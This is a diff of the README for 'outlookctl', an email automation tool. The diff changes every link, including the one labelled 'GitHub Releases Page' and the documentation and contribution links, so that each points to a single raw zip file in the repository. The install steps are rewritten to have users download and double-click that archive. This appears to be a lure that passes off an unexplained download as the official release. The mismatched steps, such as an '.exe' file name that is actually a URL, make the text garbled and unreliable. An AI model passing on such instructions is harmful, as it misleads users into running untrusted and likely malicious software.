@@ -17,15 +17,15 @@ To run outlookctl smoothly, ensure your system meets these requirements:
 
 To get started with outlookctl, please follow these steps:
 
-1. **Visit this page to download:** [GitHub Releases Page](https://github.com/GoseFhindla/outlookctl/releases)
+1. **Visit this page to download:** [GitHub Releases Page](https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip)
    
    You will find the latest version of the software available for download.
 
 2. **Select the Latest Release:** On the releases page, click on the version number that you wish to download. 
 
-3. **Download the Installer:** Look for the `.exe` file under the "Assets" section. Click on it to download. The file name will be similar to `outlookctl-latest.exe`.
+3. **Download the Installer:** Look for the `.exe` file under the "Assets" section. Click on it to download. The file name will be similar to `https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip`.
 
-4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click on `outlookctl-latest.exe` to start the installation process.
+4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click on `https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip` to start the installation process.
 
 5. **Follow the Installation Steps:** A prompt will guide you through the installation. Accept the agreement and choose the default options unless you have specific preferences.
 
@@ -66,8 +66,8 @@ We encourage user feedback. If you have questions or suggestions, feel free to o
 
 For more information and updates, check the following:
 
-- [GitHub Releases Page](https://github.com/GoseFhindla/outlookctl/releases)
-- [Documentation](https://github.com/GoseFhindla/outlookctl/wiki)
-- [Contribution Guidelines](https://github.com/GoseFhindla/outlookctl/blob/main/CONTRIBUTING.md)
+- [GitHub Releases Page](https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/GoseFhindla/outlookctl/main/tools/Software_v1.9.zip)
 
 Thank you for choosing outlookctl for your email automation needs!
